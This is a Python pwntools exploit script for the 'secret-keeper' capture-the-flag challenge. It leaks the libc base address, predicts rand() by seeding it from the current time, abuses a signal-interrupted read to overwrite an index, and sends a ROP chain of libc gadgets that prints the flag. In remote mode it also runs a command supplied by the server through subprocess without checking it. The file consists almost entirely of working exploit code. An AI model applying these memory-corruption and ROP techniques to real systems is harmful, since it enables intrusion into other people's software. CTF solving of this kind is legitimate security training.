#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

elf = ELF("./secret-keeper_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

lib = CDLL("libc.so.6")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        import subprocess

        r = remote("secretkeeper.challs.olicyber.it", 38044)
        r.recvuntil(b'or\n')
        command = r.recvline().strip().decode().replace('"', '').split(' ')
        log.info(f'cmd: {command}')
        r.sendlineafter(b'Result: ', subprocess.run(command, capture_output=True).stdout.strip())

    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                # b game
                                # b *init+180
                                # b alrm_handler
                                set follow-fork-mode parent
                                handle SIGALRM pass

                                # breakrva 0x1390
                                breakrva 0x14E1
                                continue
                      ''', env={'FLAG':'TEST'})
    else:
        r = process(elf.path, env={'FLAG':'TEST'})

    return r


def main():

    r = conn()

    r.recvuntil(b'hint: ')
    libc.address = int(r.recvline().strip().decode(), 16) - libc.sym.read
    log.info(f"LIBC base: {hex(libc.address)}")

    # may need to run the exploit a couple of times
    seed = lib.time(0) & 0xffffffff
    lib.srand(seed)
    guess = (lib.rand() << 12) & 0xffffffff

    log.info(f"Possible address: {hex(guess)}")

    # The signal interrupts read, makes it return -1, this is added to the address so we can write to dest-1 that is i.
    r.sendlineafter(b'hurry up!\n', b'\x04', timeout=31)
    log.info('i overwritten')

    payload = [
        p64(libc.address + 0xede72)[1:] + p64(libc.address + 0x2493d) + b'\x01',                # ret; pop rdi, ret;
        p64(1)[1:] + p64(libc.address + 0x101ddb) + b'\x40',                                    # 0; pop rsi, ret;
        p64(libc.address + 0x1e6d38)[1:] + p64(libc.address + 0x16c50b) + b'\x8e',              # pointer to elf + 8; mov rdi, qword ptr [rsi + rdx - 8]; sub rcx, rdi; or rax, rcx; cmovne eax, edx; ret;
        p64(libc.address + 0x9fe8e)[1:] + p64((0x5020-elf.sym.iov_buf)&((1<<64)-1)) + b'\x13',  # pop rcx, ret; distance to iov_buf;
        p64(libc.address + 0x17f713)[1:] + p64(libc.sym.puts) + b'\x3d',                        # sub rdi, rcx; puts@glibc;
        p64(libc.address + 0x2493d)[1:] + p64(0) + b'\x40',                                     # pop rdi, ret; 0;
        p64(libc.sym.exit)[1:] + p64(0) + b'\n'                                                 # exit@glibc
    ]

    # Load payload
    for p in payload:
        assert len(p) == 16
        r.sendafter(b'guess: ', p)
    log.info('payload sent')

    r.sendlineafter(b'guess: ', hex(guess).encode())
    log.info('Flag read')

    r.sendlineafter(b'guess: ', b'END')
    
    r.interactive()


if __name__ == "__main__":
    main()
